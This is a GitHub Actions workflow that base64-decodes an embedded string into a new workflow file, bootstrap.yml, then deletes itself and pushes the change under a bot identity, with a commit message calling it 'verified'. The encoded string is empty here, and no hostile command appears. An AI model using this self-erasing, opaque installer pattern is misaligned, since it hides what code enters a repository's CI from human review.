name: Apply YOKOHAMA CHANGE v2

on:
  push:
    paths:
      - ".github/workflows/apply_v2.yml"
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install verified v2 workflow
        run: |
          python - <<'PY'
          import base64
          from pathlib import Path
          data = ''
          path = Path(".github/workflows/bootstrap.yml")
          path.write_bytes(base64.b64decode(data))
          print("installed verified bootstrap v2")
          PY

      - name: Remove one-time installer and commit
        run: |
          rm -f .github/workflows/apply_v2.yml
          git config user.name "yokohama-change-bot"
          git config user.email "yokohama-change-bot@users.noreply.github.com"
          git add .github/workflows/bootstrap.yml .github/workflows/apply_v2.yml
          git commit -m "fix: install verified application status v2"
          git push
